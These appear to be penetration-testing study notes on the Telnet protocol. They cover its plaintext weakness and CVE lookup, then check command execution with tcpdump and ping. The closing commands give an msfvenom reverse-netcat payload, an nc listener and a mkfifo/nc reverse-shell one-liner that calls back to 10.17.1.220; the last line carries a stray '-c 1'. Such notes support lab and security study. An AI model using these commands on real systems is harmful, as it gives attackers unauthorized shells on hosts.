
Telnet is an application protocol which allows you, with the use of a telnet client, to connect to and execute commands on a remote machine that's hosting a telnet server.  

The telnet client will establish a connection with the server. The client will then become a virtual terminal- allowing you to interact with the remote host.

Telnet sends all messages in **clear text** and has **no specific security mechanisms**. Thus, in many applications and services, Telnet has been **replaced by SSH in most implementations**.

Telnet, being a protocol, is in and of itself insecure for the reasons we talked about earlier. It lacks encryption, so sends all communication over plaintext, and for the most part has poor access control. There are CVE's for Telnet client and server systems, however, so when exploiting you can check for those on:

- [https://www.cvedetails.com/](https://www.cvedetails.com/)
- [https://cve.mitre.org/](https://cve.mitre.org/)

You can connect to a telnet server with the following syntax:

```
 telnet [ip] [port]
```

If we receive no returned output when running commands on the telnet session, we can clarify if we're actually running system commands as well as if we're able to reach our host machine using a tcpdump listener :

```bash
sudo tcpdump ip proto \\icmp -i [network interface]
```

Then running the following in the telnet session:

```bash
ping [local ip] -c 1
```

If we get a ping we can attempt a reverse shell by obtaining an msfvenom payload and then running it in the telnet session :

```bash
msfvenom -p cmd/unix/reverse_netcat lhost=[local ip] lport=4444 R
```

```bash
nc -lvnp [listening port]
```

```bash
.RUN mkfifo /tmp/iozw; nc 10.17.1.220 1337 0</tmp/iozw | /bin/sh >/tmp/iozw 2>&1; rm /tmp/iozw -c 1
```




